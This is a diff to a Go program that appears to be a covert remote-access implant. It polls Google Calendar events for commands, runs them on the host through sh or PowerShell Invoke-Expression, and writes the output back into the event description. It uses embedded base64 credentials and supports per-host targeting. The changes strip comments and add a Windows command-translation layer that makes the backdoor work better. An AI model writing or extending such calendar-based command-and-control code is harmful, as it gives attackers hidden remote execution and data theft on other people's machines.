@@ -44,7 +44,6 @@ func main() {
 		credData = embeddedCredsFile
 		calendarID = embedCalendarID
 	} else if embedCredentials != "" && embedCalendarID != "" {
-		// Try build-time embedded
 		decoded, err := base64.StdEncoding.DecodeString(embedCredentials)
 		if err != nil {
 			log.Fatal("Failed to decode embedded credentials")
@@ -129,19 +128,16 @@ func (g *Guest) CheckAndExecute() {
 			continue
 		}
 
-		// Check if already executed by this host
 		if strings.Contains(event.Description, fmt.Sprintf("[OUTPUT-%s]", g.hostname)) {
 			continue
 		}
 
-		// Parse command for host targeting
 		cmd := strings.TrimPrefix(event.Summary, g.commandPrefix)
 		cmd = strings.TrimSpace(cmd)
 		
 		targetHost := ""
 		actualCmd := cmd
 		
-		// Check for targeted command format: @hostname:command or @*:command
 		if strings.HasPrefix(cmd, "@") {
 			parts := strings.SplitN(cmd, ":", 2)
 			if len(parts) == 2 {
@@ -161,7 +157,7 @@ func (g *Guest) CheckAndExecute() {
 }
 
 func (g *Guest) ExecuteCommand(command, args string) string {
-	// Add host identifier to all outputs
+
 	hostInfo := fmt.Sprintf("[Host: %s]\n", g.hostname)
 	log.Printf("Executing command: %s", command)
 	
@@ -201,7 +197,9 @@ func (g *Guest) ExecuteCommand(command, args string) string {
 	default:
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/c", command)
+
+			psCommand := g.prepareWindowsCommand(command)
+			cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psCommand)
 		} else {
 			cmd = exec.Command("sh", "-c", command)
 		}
@@ -214,13 +212,72 @@ func (g *Guest) ExecuteCommand(command, args string) string {
 	}
 }
 
+func (g *Guest) prepareWindowsCommand(command string) string {
+
+	command = strings.TrimSpace(command)
+	
+	if strings.Contains(command, "../") {
+		command = strings.ReplaceAll(command, "../", "..\\")
+	}
+	if strings.Contains(command, "./") {
+		command = strings.ReplaceAll(command, "./", ".\\")
+	}
+	
+	switch {
+	case strings.HasPrefix(command, "ls"):
+		if command == "ls" {
+			return "Get-ChildItem"
+		}
+		args := strings.TrimPrefix(command, "ls")
+		args = strings.TrimSpace(args)
+		if args != "" {
+			return fmt.Sprintf("Get-ChildItem %s", args)
+		}
+		return "Get-ChildItem"
+		
+	case strings.HasPrefix(command, "cat "):
+
+		file := strings.TrimPrefix(command, "cat ")
+		file = strings.TrimSpace(file)
+		return fmt.Sprintf("Get-Content '%s'", file)
+		
+	case strings.HasPrefix(command, "ps"):
+
+		if command == "ps" {
+			return "Get-Process"
+		}
+		return "Get-Process"
+		
+	case strings.HasPrefix(command, "cd "):
+
+		path := strings.TrimPrefix(command, "cd ")
+		path = strings.TrimSpace(path)
+
+		path = strings.Trim(path, "\"'")
+		return fmt.Sprintf("Set-Location '%s'; Get-Location", path)
+		
+	case command == "pwd":
+		return "Get-Location"
+		
+	default:
+
+		escaped := strings.ReplaceAll(command, "'", "''")
+		
+
+		if strings.ContainsAny(command, "|;&") {
+			return escaped
+		}
+		
+		return fmt.Sprintf("Invoke-Expression '%s'", escaped)
+	}
+}
+
 func (g *Guest) UpdateEventWithOutput(eventID, output string) error {
 	event, err := g.service.Events.Get(g.calendarID, eventID).Do()
 	if err != nil {
 		return err
 	}
 
-	// Add host-specific output marker
 	event.Description = fmt.Sprintf("%s\n\n[OUTPUT-%s]\n%s\n[/OUTPUT-%s]",
 		event.Description, g.hostname, output, g.hostname)
 	event.ColorId = "11"
